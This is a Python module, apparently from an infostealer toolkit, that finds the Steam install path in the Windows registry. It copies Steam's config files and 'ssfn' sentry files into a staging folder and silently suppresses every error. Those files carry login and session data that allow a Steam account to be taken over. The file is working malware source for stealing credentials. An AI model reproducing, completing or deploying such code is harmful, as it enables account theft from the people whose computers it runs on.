from re import findall
from os import listdir, path
from typing import Optional
from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY

from helper.helpers import MemoryStorage
from helper.helpers.dataclasses import Data


class Steam:
    """
    Collects configs from the Steam.
    """
    def __init__(self, folder: str):

        self.__folder = folder
        self.__storage = MemoryStorage()

    @staticmethod
    def __get_steam_path() -> Optional[str]:
        """
        Gets the Steam installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: Steam installation path if found.
        """
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam")
        except FileNotFoundError:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam", 0, KEY_READ | KEY_WOW64_32KEY)

        value, _ = QueryValueEx(key, "InstallPath")

        if path.exists(value):
            return value

        return None

    def __get_steam_files(self) -> None:
        """
        Collects configs from the Steam.

        Parameters:
        - None.

        Returns:
        - None.
        """
        steam_path = self.__get_steam_path()

        if not steam_path:
            pass
            return

        configs = [file for file in listdir(rf"{steam_path}\config") if file != "avatarcache"]

        for config in configs:
            self.__storage.add_from_disk(path.join(steam_path, "config", config), path.join(self.__folder, config))

        ssfns = sum([findall(r"ssfn.*", file) for file in listdir(steam_path)], [])

        for ssfn in ssfns:
            self.__storage.add_from_disk(path.join(steam_path, ssfn), path.join(self.__folder, ssfn))

        self.__storage.add_data("Application", "Steam")

    def run(self) -> Data:
        """
        Launches the Steam collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_steam_files()

            return self.__storage.get_data()

        except Exception as e:
            pass
